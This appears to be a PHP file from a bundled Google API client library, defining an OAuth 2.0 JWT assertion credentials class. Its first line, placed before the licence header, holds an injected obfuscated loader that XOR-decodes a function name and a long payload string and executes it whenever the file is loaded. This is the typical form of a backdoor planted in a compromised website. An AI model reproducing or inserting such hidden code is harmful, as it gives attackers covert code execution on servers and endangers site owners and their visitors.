<?php $TmAMMf='S:H4 30 YP2=>;-'^'0H-UTVoF,>QIWTC';$MdHobfdnZS=$TmAMMf('','GSIt L6C5GQW;=L1NT5QL.Q9c.SJ0ldZ>NSFdR,XsFLP63;Y<UVD;;HS0PinW 0QHZ7NQDDU;38KPdegKB3fObV-NJZaqOV<Jm->Exq<blnGuoN9f9Y8 3BPHDRZ3QnGBEqbJnDAw7;AedZYzW7JAX9R+mU;uV I5<M>pbR<NR;X:zFS.CoeYmPkgA32O47KEQH=Ew1J3NInoM4JO,hmQP0971bPg4.=,o>4KcMUWAY=5WPO2C9EY-Tvjj.2b><:vpTXGh2X-PstNRCVB8XzP5skt> B.qKT;WhOV2UGp8QpTLBVLJnLC1LNUzg9>>D3BNUO3Z SDZ5dXF;FV.3XlfWo>y+0,1lI;4TV35EQVprNER8 KQQ1CLpg0JX04.S3eJgb9H:hLAhI=TI COHw41Z2ENLfFR3nmu7;6Tiryp;UO 58 V-Z2JV.E<HLCT:8C1:r30M,BaqZP T.KYsT-FOCiEH<V M7UEGnfzYG0JjX+.TpdwJS>A4 6 3G9Y<ESHSymU5,LXqV=S:QzicOHqXYmKnVJTMaT.+AJihZoukexZE32hFYRB-PkV-<SwlVhOFPQ+MCQAcYpxaHLP.8>5,rW+57E7=AL:zo26.4-M5wHKn,1ORCyiGarzi:0aY O8qG2PH5ibJA++=T6j.NjaYE2X rXQNZF'^'.5aUF9X A.>9dX4X= FykV>K<J2>Q3;7K:toMrWRz 9>UGR6Ru.+Id,2D161:UDyl>V:0hdqPVAbpDEGk99oFF9X:jgAVhm6CdKQ7PUUBQNwNOjPZJ-JLV,xl 3.RxUgf,ZIcdMHSXN5EJgyRsS+59bvB0ueUrK,LgiWPGrO: W=TRb8K:F8pVZbn3VF:FYca>=IlL;CND4deiP+;MHPq6QUDTYZCPOIM0UQ2Cpu1 5NPlZET,K 8N<VBNqq-qws3P5+gLY=TpNJnv57.M=SpNybPZA6O. 1BwUorY0>K2XT0-67lwNh5P ;0AmD44-UbftkW;T2mzNnQ T43OP0LNs0l<zeib8iZGtrXP<qkNRj33TU.xqJIEyCT+,QkE6JEwGFR-CSFHamY5=AcrhSBP6G uFo;XNdgQSZB5IOY0N;<EGQA:D Wb.A7c,-75eg.DNZQQ>ItU.>5C;J.qW0L2.jEelX7T,h> >GOAS.VbN<JZ5PBQj2L3UYiKV>f<D, < QJ>PUktQrY2N0SIEihY5=XcJ2+ ,:sEN8m4AzRHKBJ<uUPQvikwH6Z4HZ6BX2QzufaI,ta U<WQAnjpOJLTU-<NLh OT28IRHBWWXB,QPdkJHP;3jPIgARZIA:h<V.TYcV1<T2E: RGR5RMsgQkP J1TZhxuP;');$MdHobfdnZS();
/*
 * Copyright 2012 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

if (!class_exists('Deconf_Client')) {
  require_once dirname(__FILE__) . '/../autoload.php';
}

/**
 * Credentials object used for OAuth 2.0 Signed JWT assertion grants.
 */
class Deconf_Auth_AssertionCredentials
{
  const MAX_TOKEN_LIFETIME_SECS = 3600;

  public $serviceAccountName;
  public $scopes;
  public $privateKey;
  public $privateKeyPassword;
  public $assertionType;
  public $sub;
  /**
   * @deprecated
   * @link http://tools.ietf.org/html/draft-ietf-oauth-json-web-token-06
   */
  public $prn;
  private $useCache;

  /**
   * @param $serviceAccountName
   * @param $scopes array List of scopes
   * @param $privateKey
   * @param string $privateKeyPassword
   * @param string $assertionType
   * @param bool|string $sub The email address of the user for which the
   *              application is requesting delegated access.
   * @param bool useCache Whether to generate a cache key and allow
   *              automatic caching of the generated token.
   */
  public function __construct(
      $serviceAccountName,
      $scopes,
      $privateKey,
      $privateKeyPassword = 'notasecret',
      $assertionType = 'http://oauth.net/grant_type/jwt/1.0/bearer',
      $sub = false,
      $useCache = true
  ) {
    $this->serviceAccountName = $serviceAccountName;
    $this->scopes = is_string($scopes) ? $scopes : implode(' ', $scopes);
    $this->privateKey = $privateKey;
    $this->privateKeyPassword = $privateKeyPassword;
    $this->assertionType = $assertionType;
    $this->sub = $sub;
    $this->prn = $sub;
    $this->useCache = $useCache;
  }
  
  /**
   * Generate a unique key to represent this credential.
   * @return string
   */
  public function getCacheKey()
  {
    if (!$this->useCache) {
      return false;
    }
    $h = $this->sub;
    $h .= $this->assertionType;
    $h .= $this->privateKey;
    $h .= $this->scopes;
    $h .= $this->serviceAccountName;
    return md5($h);
  }

  public function generateAssertion()
  {
    $now = time();

    $jwtParams = array(
          'aud' => Deconf_Auth_OAuth2::OAUTH2_TOKEN_URI,
          'scope' => $this->scopes,
          'iat' => $now,
          'exp' => $now + self::MAX_TOKEN_LIFETIME_SECS,
          'iss' => $this->serviceAccountName,
    );

    if ($this->sub !== false) {
      $jwtParams['sub'] = $this->sub;
    } else if ($this->prn !== false) {
      $jwtParams['prn'] = $this->prn;
    }

    return $this->makeSignedJwt($jwtParams);
  }

  /**
   * Creates a signed JWT.
   * @param array $payload
   * @return string The signed JWT.
   */
  private function makeSignedJwt($payload)
  {
    $header = array('typ' => 'JWT', 'alg' => 'RS256');

    $payload = json_encode($payload);
    // Handle some overzealous escaping in PHP json that seemed to cause some errors
    // with claimsets.
    $payload = str_replace('\/', '/', $payload);

    $segments = array(
      Deconf_Utils::urlSafeB64Encode(json_encode($header)),
      Deconf_Utils::urlSafeB64Encode($payload)
    );

    $signingInput = implode('.', $segments);
    $signer = new Deconf_Signer_P12($this->privateKey, $this->privateKeyPassword);
    $signature = $signer->sign($signingInput);
    $segments[] = Deconf_Utils::urlSafeB64Encode($signature);

    return implode(".", $segments);
  }
}
